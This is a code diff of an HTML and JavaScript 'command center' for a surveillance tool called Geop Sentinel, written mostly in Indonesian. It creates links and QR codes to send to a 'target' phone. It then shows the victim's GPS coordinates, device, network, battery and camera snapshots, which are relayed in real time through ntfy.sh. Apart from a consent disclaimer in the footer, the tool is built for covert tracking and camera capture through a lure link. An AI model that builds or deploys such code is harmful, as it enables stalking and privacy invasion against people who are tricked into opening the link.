@@ -3,168 +3,189 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Geop Sentinel — Pusat Kendali</title>
+<title>Geop Sentinel — Command Center</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛰️</text></svg>">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
 <style>
-:root{--bg:#070d18;--card:#0f1a2e;--line:#22304d;--txt:#e6edf7;--mut:#8ea3c8;--acc:#22d3ee;--ok:#34d399;--bad:#f87171;--warn:#fbbf24}
-*{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',system-ui,sans-serif}
-body{background:radial-gradient(1000px 500px at 85% -10%,rgba(34,211,238,.09),transparent),var(--bg);color:var(--txt);min-height:100vh;padding:22px}
-.wrap{max-width:1100px;margin:0 auto}
-header{display:flex;align-items:center;gap:12px;margin-bottom:18px;flex-wrap:wrap}
-header h1{font-size:1.25rem;letter-spacing:.5px}
-header h1 span{color:var(--acc)}
-.dot{width:10px;height:10px;border-radius:50%;background:var(--bad);box-shadow:0 0 12px var(--bad)}
-.dot.on{background:var(--ok);box-shadow:0 0 12px var(--ok)}
-#status{color:var(--mut);font-size:.75rem;margin-left:auto}
-.grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
-@media(max-width:900px){.grid{grid-template-columns:1fr}}
-.card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:18px;margin-bottom:16px}
-.card h2{font-size:.8rem;color:var(--acc);letter-spacing:1.5px;margin-bottom:12px}
+:root{--bg:#04070d;--panel:#0b1220;--line:rgba(148,163,184,.14);--txt:#e6edf7;--mut:#7d8cab;--acc:#22d3ee;--acc2:#818cf8;--ok:#34d399;--bad:#fb7185;--warn:#fbbf24;--mono:'JetBrains Mono',monospace;--disp:'Space Grotesk',sans-serif}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--txt);min-height:100vh;
+background-image:radial-gradient(900px 480px at 85% -10%,rgba(34,211,238,.08),transparent),radial-gradient(700px 400px at -10% 30%,rgba(129,140,248,.07),transparent)}
+.app{max-width:1280px;margin:0 auto;padding:22px}
+.topbar{display:flex;justify-content:space-between;align-items:center;gap:14px;margin-bottom:20px;flex-wrap:wrap}
+.brand{display:flex;gap:14px;align-items:center}
+.logo{width:46px;height:46px;border-radius:14px;background:linear-gradient(135deg,#0891b2,#818cf8);display:grid;place-items:center;font-size:22px;box-shadow:0 0 28px rgba(34,211,238,.35)}
+.brand h1{font-family:var(--disp);font-size:1.15rem;letter-spacing:2px}
+.brand h1 span{color:var(--acc)}
+.brand p{color:var(--mut);font-size:.7rem;letter-spacing:1.5px;text-transform:uppercase}
+.top-right{display:flex;gap:10px;align-items:center}
+.pill{display:flex;gap:8px;align-items:center;border:1px solid var(--line);border-radius:999px;padding:7px 14px;font-size:.7rem;font-weight:700;letter-spacing:1px;color:var(--mut)}
+.pill i{width:8px;height:8px;border-radius:50%;background:var(--bad);box-shadow:0 0 10px var(--bad)}
+.pill.live{color:var(--ok);border-color:rgba(52,211,153,.4)} .pill.live i{background:var(--ok);box-shadow:0 0 10px var(--ok);animation:pl 1.2s infinite}
+.pill.retry{color:var(--warn);border-color:rgba(251,191,36,.4)} .pill.retry i{background:var(--warn)}
+@keyframes pl{50%{opacity:.4}}
+.clock{font-family:var(--mono);font-size:.8rem;color:var(--mut);border:1px solid var(--line);border-radius:10px;padding:8px 12px}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:16px}
+.stat{background:linear-gradient(180deg,rgba(148,163,184,.06),transparent),var(--panel);border:1px solid var(--line);border-radius:14px;padding:14px 16px}
+.stat span{display:block;color:var(--mut);font-size:.62rem;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:6px}
+.stat b{font-family:var(--mono);font-size:.85rem;font-weight:600;word-break:break-all}
+.stat b.cy{color:var(--acc)}
+.grid{display:grid;grid-template-columns:400px 1fr;gap:16px;align-items:start}
+.col{display:flex;flex-direction:column;gap:16px}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:18px;padding:18px;position:relative;overflow:hidden}
+.card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(34,211,238,.55),transparent)}
+.card h2{font-family:var(--disp);font-size:.68rem;letter-spacing:2.5px;color:var(--mut);text-transform:uppercase;margin-bottom:14px;display:flex;align-items:center;gap:8px}
 .row{display:flex;gap:10px;flex-wrap:wrap}
-input{flex:1;min-width:200px;background:#0b1220;border:1px solid var(--line);border-radius:10px;padding:11px 12px;color:var(--txt);font-size:.8rem}
-button{border:none;border-radius:10px;padding:11px 16px;font-weight:700;cursor:pointer;font-size:.78rem;background:linear-gradient(90deg,#0891b2,#22d3ee);color:#03121a}
-button.ghost{background:transparent;border:1px solid var(--line);color:var(--mut)}
-.linkbox{margin-top:12px}
-#qrBox{display:flex;gap:14px;align-items:center;margin-top:12px}
-#qr{border-radius:12px;border:1px solid var(--line);background:#fff;padding:6px}
-.feedwrap{position:relative;border-radius:14px;overflow:hidden;border:1px solid var(--line);background:#000;min-height:260px;display:flex;align-items:center;justify-content:center}
-#feed{width:100%;display:block;max-height:420px;object-fit:contain}
-.live{position:absolute;top:10px;left:10px;background:rgba(248,113,113,.9);color:#fff;font-size:.68rem;font-weight:800;padding:4px 10px;border-radius:999px;letter-spacing:1px}
-#feedTime{position:absolute;bottom:8px;right:10px;font-size:.68rem;color:#fff;background:rgba(0,0,0,.55);padding:3px 8px;border-radius:6px}
-.kv{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px 18px;margin:14px 0}
-.kv div span{display:block;color:var(--mut);font-size:.68rem;margin-bottom:2px}
-.kv div b{font-size:.82rem}
-#map{width:100%;height:260px;border:none;border-radius:12px;border:1px solid var(--line)}
-.log{max-height:220px;overflow:auto;background:#0b1220;border:1px solid var(--line);border-radius:10px;padding:10px;font-size:.73rem;color:var(--mut)}
-.ln{margin:3px 0}.ln span{color:var(--acc);margin-right:8px}
-a{color:var(--acc)}
-small.note{color:var(--mut);font-size:.7rem;display:block;margin-top:10px}
+.btn{border:none;border-radius:11px;padding:12px 16px;font-weight:700;font-size:.76rem;cursor:pointer;letter-spacing:.4px;background:linear-gradient(90deg,#0891b2,#22d3ee);color:#03121a;transition:.2s;box-shadow:0 4px 18px rgba(34,211,238,.25)}
+.btn:hover{transform:translateY(-1px);box-shadow:0 6px 24px rgba(34,211,238,.4)}
+.btn.ghost{background:transparent;border:1px solid var(--line);color:var(--mut);box-shadow:none}
+.btn.danger{background:transparent;border:1px solid rgba(251,113,133,.4);color:var(--bad);box-shadow:none}
+.input{flex:1;min-width:180px;background:#070d18;border:1px solid var(--line);border-radius:11px;padding:12px;color:var(--txt);font-family:var(--mono);font-size:.72rem}
+.input:focus{outline:none;border-color:var(--acc)}
+.qrbox{display:flex;gap:14px;align-items:center;margin-top:14px}
+.qrbox img{border-radius:12px;background:#fff;padding:6px;border:1px solid var(--line)}
+.feedwrap{position:relative;border-radius:14px;background:#000;border:1px solid var(--line);aspect-ratio:16/10;overflow:hidden;cursor:pointer}
+#feed{width:100%;height:100%;object-fit:contain}
+.corner{position:absolute;width:22px;height:22px;border-color:var(--acc);border-style:solid;border-width:0;opacity:.8}
+.tl{top:8px;left:8px;border-top-width:2px;border-left-width:2px}.tr{top:8px;right:8px;border-top-width:2px;border-right-width:2px}
+.bl{bottom:8px;left:8px;border-bottom-width:2px;border-left-width:2px}.br{bottom:8px;right:8px;border-bottom-width:2px;border-right-width:2px}
+.scan{position:absolute;inset:0;pointer-events:none;background:repeating-linear-gradient(0deg,transparent 0 3px,rgba(255,255,255,.02) 3px 4px)}
+.livebadge{position:absolute;top:12px;left:40px;background:rgba(251,113,133,.92);color:#fff;font-size:.64rem;font-weight:800;letter-spacing:1.5px;padding:5px 12px;border-radius:999px;animation:pl 1.2s infinite}
+#feedTime{position:absolute;bottom:10px;right:40px;font-family:var(--mono);font-size:.64rem;color:#fff;background:rgba(0,0,0,.6);padding:4px 9px;border-radius:7px}
+.kv{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px}
+.kv span{display:block;color:var(--mut);font-size:.62rem;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:4px}
+.kv b{font-family:var(--mono);font-size:.78rem;font-weight:600}
+.coordline{display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin:14px 0}
+.coordline code{font-family:var(--mono);font-size:.85rem;color:var(--acc)}
+a{color:var(--acc);font-size:.75rem}
+#map{width:100%;height:280px;border:none;border-radius:14px;border:1px solid var(--line);filter:saturate(.85) contrast(1.05)}
+.log{height:230px;overflow:auto;background:#070d18;border:1px solid var(--line);border-radius:12px;padding:12px;font-family:var(--mono);font-size:.68rem;line-height:1.7;color:var(--mut)}
+.log .t{color:var(--acc2)} .log .g{color:var(--ok)} .log .r{color:var(--bad)}
+footer{margin-top:18px;color:#4b5b7c;font-size:.66rem;text-align:center;line-height:1.7}
+@media(max-width:1000px){.grid{grid-template-columns:1fr}.stats{grid-template-columns:repeat(2,1fr)}}
 </style>
 </head>
 <body>
-<div class="wrap">
-<header>
-  <div class="dot" id="dot"></div>
-  <h1>🛰️ GEOP <span>SENTINEL</span> — PUSAT KENDALI</h1>
-  <div id="status">BELUM MENGAWASI</div>
-</header>
+<div class="app">
+  <header class="topbar">
+    <div class="brand">
+      <div class="logo">🛰️</div>
+      <div><h1>GEOP <span>SENTINEL</span></h1><p>Remote Verification Command Center</p></div>
+    </div>
+    <div class="top-right">
+      <div class="pill" id="connPill"><i></i><span id="connTxt">OFFLINE</span></div>
+      <div class="clock" id="clock">--:--:--</div>
+    </div>
+  </header>
 
-<div class="grid">
-  <div>
-    <div class="card">
-      <h2>🔗 GENERATOR LINK</h2>
-      <div class="row">
-        <button id="btnNew">⚡ Buat Link Baru</button>
-        <button class="ghost" id="btnCopy">📋 Salin Link</button>
-      </div>
-      <div class="linkbox"><input id="linkOut" readonly placeholder="Link akan muncul di sini…"></div>
-      <div id="qrBox" hidden><img id="qr" width="140" height="140" alt="QR"><small class="note">QR Code — scan dari HP target.</small></div>
+  <section class="stats">
+    <div class="stat"><span>Topic Aktif</span><b class="cy" id="sessTopic">–</b></div>
+    <div class="stat"><span>Snapshot Diterima</span><b id="snapCount">0</b></div>
+    <div class="stat"><span>Lokasi Terakhir</span><b id="lastLocTime">–</b></div>
+    <div class="stat"><span>Durasi Sesi</span><b id="sessTime">00:00:00</b></div>
+  </section>
+
+  <main class="grid">
+    <div class="col">
+      <section class="card">
+        <h2>🔗 Generator Link Operasi</h2>
+        <div class="row"><button class="btn" id="btnNew">⚡ Buat Link Baru</button><button class="btn ghost" id="btnCopy"> Salin</button></div>
+        <div style="margin-top:12px"><input class="input" id="linkOut" readonly placeholder="Link operasi muncul di sini…"></div>
+        <div class="qrbox" id="qrBox" hidden><img id="qr" width="132" height="132" alt="QR"><span style="color:var(--mut);font-size:.7rem">Scan dari HP target<br>atau kirim link via chat.</span></div>
+      </section>
+      <section class="card">
+        <h2>📡 Sesi & Relay</h2>
+        <div class="row"><input class="input" id="watchIn" placeholder="tempel topic / link lama…"><button class="btn ghost" id="btnWatch">🔌 Sambung</button><button class="btn danger" id="btnStop">⛔</button></div>
+        <p style="color:var(--mut);font-size:.66rem;margin-top:10px">Relay ntfy.sh menyimpan data 12 jam. Riwayat dimuat otomatis saat menyambung.</p>
+      </section>
+      <section class="card">
+        <h2>📜 Console Log</h2>
+        <div class="log" id="log">[SYS] Menunggu aktivitas…</div>
+        <div class="row" style="margin-top:12px"><button class="btn ghost" id="btnExport">📥 Export Laporan JSON</button></div>
+      </section>
     </div>
-    <div class="card">
-      <h2>📡 SAMBUNGKAN TOPIC LAMA</h2>
-      <div class="row">
-        <input id="watchIn" placeholder="tempel topic / link lama…">
-        <button class="ghost" id="btnWatch">🔌 Sambung</button>
-        <button class="ghost" id="btnStop">⛔ Stop</button>
-      </div>
-      <small class="note">Data relay tersimpan 12 jam di ntfy.sh. Riwayat otomatis dimuat saat menyambung.</small>
+
+    <div class="col">
+      <section class="card">
+        <h2>🎥 Live Camera Feed</h2>
+        <div class="feedwrap" id="feedWrap">
+          <img id="feed" alt="">
+          <span class="corner tl"></span><span class="corner tr"></span><span class="corner bl"></span><span class="corner br"></span>
+          <div class="scan"></div><div class="livebadge">● LIVE</div><div id="feedTime">menunggu snapshot…</div>
+        </div>
+      </section>
+      <section class="card">
+        <h2>📍 Telemetri Target</h2>
+        <div class="kv">
+          <div><span>Perangkat</span><b id="dev">–</b></div>
+          <div><span>Jaringan</span><b id="net">–</b></div>
+          <div><span>Baterai</span><b id="batt">–</b></div>
+          <div><span>Akurasi GPS</span><b id="acc">–</b></div>
+        </div>
+        <div class="coordline"><code id="coord">– , –</code><a id="gmaps" target="_blank" href="#">Google Maps ↗</a><button class="btn ghost" id="btnCopyCoord" style="padding:7px 12px">📋 Koordinat</button></div>
+        <iframe id="map" src="about:blank"></iframe>
+      </section>
     </div>
-    <div class="card">
-      <h2>📜 LOG KEJADIAN</h2>
-      <div class="log" id="log"><div class="ln">Menunggu aktivitas…</div></div>
-      <div class="row" style="margin-top:10px"><button class="ghost" id="btnExport">📥 Export Laporan JSON</button></div>
-    </div>
-  </div>
-  <div>
-    <div class="card">
-      <h2>🎥 FEED KAMERA LIVE</h2>
-      <div class="feedwrap">
-        <img id="feed" alt="Menunggu snapshot…">
-        <div class="live">● LIVE</div>
-        <div id="feedTime">–</div>
-      </div>
-    </div>
-    <div class="card">
-      <h2>📍 TELEMETRI TARGET</h2>
-      <div class="kv">
-        <div><span>PERANGKAT</span><b id="dev">–</b></div>
-        <div><span>JARINGAN</span><b id="net">–</b></div>
-        <div><span>BATERAI</span><b id="batt">–</b></div>
-        <div><span>AKURASI GPS</span><b id="acc">–</b></div>
-      </div>
-      <div class="kv"><div style="grid-column:1/-1"><span>KOORDINAT</span><b id="coord">–</b> &nbsp;<a id="gmaps" target="_blank" href="#">Buka Google Maps ↗</a></div></div>
-      <iframe id="map" src="about:blank"></iframe>
-    </div>
-  </div>
-</div>
+  </main>
+  <footer>GEOP SENTINEL v2.1 — Data terenkripsi HTTPS • Relay sementara 12 jam • Gunakan hanya dengan persetujuan target. Penyalahgunaan melanggar UU PDP & UU ITE.</footer>
 </div>
 <script>
 const NT='https://ntfy.sh/';
 const $=s=>document.querySelector(s);
 const esc=s=>String(s??'').replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
-let topic=null,es=null,events=[],raw=[];
+let topic=null,es=null,raw=[],snapCount=0,sessionStart=null,lastMap=0,lastLoc=null;
+
+setInterval(()=>{$('#clock').textContent=new Date().toLocaleTimeString('id-ID');},1000);
+setInterval(()=>{if(sessionStart){const s=Math.floor((Date.now()-sessionStart)/1000);$('#sessTime').textContent=[Math.floor(s/3600),Math.floor(s/60)%60,s%60].map(x=>String(x).padStart(2,'0')).join(':');}},1000);
 
 function rndTopic(){const c='abcdefghijklmnopqrstuvwxyz0123456789';return[...crypto.getRandomValues(new Uint8Array(14))].map(x=>c[x%c.length]).join('')}
 function viewerUrl(t){return new URL('viewer.html?t='+t,location.href).href}
+function setConn(st){const p=$('#connPill');p.className='pill '+(st==='live'?'live':st==='retry'?'retry':'');$('#connTxt').textContent=st==='live'?'LIVE':st==='retry'?'RECONNECT…':'OFFLINE';}
+function pushLog(s,cls){const l=$('#log');l.innerHTML+=`<div><span class="t">[${new Date().toLocaleTimeString('id-ID')}]</span> <span class="${cls||''}">${s}</span></div>`;l.scrollTop=l.scrollHeight;}
 
 $('#btnNew').onclick=()=>{
-  const t=rndTopic();
-  localStorage.setItem('sentinel_topic',t);
+  const t=rndTopic();localStorage.setItem('sentinel_topic',t);
   $('#linkOut').value=viewerUrl(t);
-  $('#qr').src='https://api.qrserver.com/v1/create-qr-code/?size=140x140&data='+encodeURIComponent(viewerUrl(t));
-  $('#qrBox').hidden=false;
-  startWatch(t);
+  $('#qr').src='https://api.qrserver.com/v1/create-qr-code/?size=132x132&data='+encodeURIComponent(viewerUrl(t));
+  $('#qrBox').hidden=false;startWatch(t);
 };
-$('#btnCopy').onclick=async()=>{try{await navigator.clipboard.writeText($('#linkOut').value);alert('Link disalin ✅');}catch(e){$('#linkOut').select();document.execCommand('copy');}};
-$('#btnWatch').onclick=()=>{
-  let v=$('#watchIn').value.trim();
-  const m=v.match(/t=([a-z0-9]+)/i); if(m)v=m[1];
-  if(v)startWatch(v);
-};
+$('#btnCopy').onclick=async()=>{try{await navigator.clipboard.writeText($('#linkOut').value);pushLog('Link disalin ke clipboard','g');}catch(e){}};
+$('#btnCopyCoord').onclick=async()=>{if(lastLoc){try{await navigator.clipboard.writeText(lastLoc.lat+','+lastLoc.lon);pushLog('Koordinat disalin','g');}catch(e){}}};
+$('#btnWatch').onclick=()=>{let v=$('#watchIn').value.trim();const m=v.match(/t=([a-z0-9]+)/i);if(m)v=m[1];if(v)startWatch(v);};
 $('#btnStop').onclick=stopWatch;
-$('#btnExport').onclick=()=>{
-  const a=document.createElement('a');
-  a.href=URL.createObjectURL(new Blob([JSON.stringify({topic,exported:new Date().toISOString(),events:raw},null,2)],{type:'application/json'}));
-  a.download='sentinel_report_'+(topic||'x')+'.json';a.click();
-};
+$('#btnExport').onclick=()=>{const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([JSON.stringify({topic,exported:new Date().toISOString(),snapshots:snapCount,data:raw},null,2)],{type:'application/json'}));a.download='sentinel_'+(topic||'x')+'.json';a.click();pushLog('Laporan JSON diunduh','g');};
+$('#feedWrap').onclick=()=>{const s=$('#feed').src;if(s.startsWith('http'))window.open(s,'_blank');};
 
 async function startWatch(t){
-  stopWatch(); topic=t; events=[]; raw=[];
-  $('#status').textContent='MENGAWASI: '+t;
-  $('#dot').classList.add('on');
-  pushLog('📡 Menghubungkan ke relay…');
-  try{
-    const r=await fetch(NT+t+'/json?poll=1');
-    (await r.text()).split('\n').filter(Boolean).forEach(l=>{try{handle(JSON.parse(l))}catch(e){}});
-  }catch(e){pushLog('⚠️ Gagal memuat riwayat');}
+  stopWatch();topic=t;raw=[];snapCount=0;sessionStart=Date.now();lastMap=0;
+  $('#sessTopic').textContent=t;$('#snapCount').textContent='0';$('#sessTime').textContent='00:00:00';
+  $('#log').innerHTML='';pushLog('Menghubungkan ke relay ntfy.sh…');
+  try{const r=await fetch(NT+t+'/json?poll=1');(await r.text()).split('\n').filter(Boolean).forEach(l=>{try{handle(JSON.parse(l))}catch(e){}});}catch(e){pushLog('Gagal memuat riwayat','r');}
   es=new EventSource(NT+t+'/sse');
+  es.onopen=()=>{setConn('live');pushLog('Siaran LIVE terhubung. Bagikan link ke target.','g');};
+  es.onerror=()=>setConn('retry');
   es.onmessage=e=>{try{handle(JSON.parse(e.data))}catch(err){}};
-  pushLog('✅ LIVE terhubung. Bagikan link ke target.');
 }
-function stopWatch(){if(es){es.close();es=null;}$('#dot').classList.remove('on');$('#status').textContent='BELUM MENGAWASI';}
+function stopWatch(){if(es){es.close();es=null;}sessionStart=null;setConn('off');pushLog('Pengawasan dihentikan','r');}
 
 function handle(m){
   if(m.event&&m.event!=='message')return;
   raw.push(m);
   const time=new Date((m.time||Date.now()/1000)*1000).toLocaleTimeString('id-ID');
   const t=m.title||'';
-  if(t==='META'){try{const d=JSON.parse(m.message);$('#dev').textContent=d.device||'–';$('#net').textContent=d.net||'–';$('#batt').textContent=d.batt||'–';pushLog('📱 Perangkat: '+esc((d.device||'').slice(0,60)));}catch(e){}}
-  else if(t==='LOC'){try{const d=JSON.parse(m.message);
-    $('#coord').textContent=d.lat.toFixed(6)+', '+d.lon.toFixed(6);
+  if(t==='META'){try{const d=JSON.parse(m.message);$('#dev').textContent=d.device||'–';$('#net').textContent=(d.net||'–').toUpperCase();$('#batt').textContent=d.batt||'–';pushLog('📱 Perangkat: '+esc(d.device||''));}catch(e){}}
+  else if(t==='LOC'){try{const d=JSON.parse(m.message);lastLoc=d;
+    $('#coord').textContent=d.lat.toFixed(6)+' , '+d.lon.toFixed(6);
     $('#acc').textContent='±'+Math.round(d.acc)+' m';
-    $('#map').src='https://www.openstreetmap.org/export/embed.html?bbox='+(d.lon-0.004)+','+(d.lat-0.0025)+','+(d.lon+0.004)+','+(d.lat+0.0025)+'&layer=mapnik&marker='+d.lat+','+d.lon;
+    $('#lastLocTime').textContent=time;
     $('#gmaps').href='https://www.google.com/maps/search/?api=1&query='+d.lat+','+d.lon;
-    pushLog('📍 Lokasi: '+d.lat.toFixed(5)+', '+d.lon.toFixed(5)+' (±'+Math.round(d.acc)+'m)');}catch(e){}}
-  else if(t==='CAM'){ if(m.attachment&&m.attachment.url){$('#feed').src=m.attachment.url;$('#feedTime').textContent='Snapshot '+time;} pushLog('📸 Snapshot kamera diterima'); }
-  else if(t==='STATUS'){ pushLog('ℹ️ '+esc(m.message||'')); }
+    if(Date.now()-lastMap>10000){lastMap=Date.now();$('#map').src='https://www.openstreetmap.org/export/embed.html?bbox='+(d.lon-0.004)+','+(d.lat-0.0025)+','+(d.lon+0.004)+','+(d.lat+0.0025)+'&layer=mapnik&marker='+d.lat+','+d.lon;}
+    pushLog('📍 LOC '+d.lat.toFixed(5)+','+d.lon.toFixed(5)+' ±'+Math.round(d.acc)+'m','g');}catch(e){}}
+  else if(t==='CAM'){if(m.attachment&&m.attachment.url){snapCount++;$('#snapCount').textContent=snapCount;$('#feed').src=m.attachment.url;$('#feedTime').textContent='SNAP #'+snapCount+' • '+time;}pushLog('📸 Snapshot #'+snapCount+' diterima');}
+  else if(t==='STATUS'){pushLog('ℹ️ '+esc(m.message||''));}
 }
-function pushLog(s){
-  events.unshift({time:new Date().toLocaleTimeString('id-ID'),s});
-  $('#log').innerHTML=events.slice(0,80).map(e=>'<div class="ln"><span>'+e.time+'</span>'+e.s+'</div>').join('');
-}
-window.addEventListener('load',()=>{
-  const t=localStorage.getItem('sentinel_topic');
-  if(t){$('#linkOut').value=viewerUrl(t);$('#qr').src='https://api.qrserver.com/v1/create-qr-code/?size=140x140&data='+encodeURIComponent(viewerUrl(t));$('#qrBox').hidden=false;startWatch(t);}
-});
+window.addEventListener('load',()=>{const t=localStorage.getItem('sentinel_topic');if(t){$('#linkOut').value=viewerUrl(t);$('#qr').src='https://api.qrserver.com/v1/create-qr-code/?size=132x132&data='+encodeURIComponent(viewerUrl(t));$('#qrBox').hidden=false;startWatch(t);}});
 </script>
 </body>
 </html>
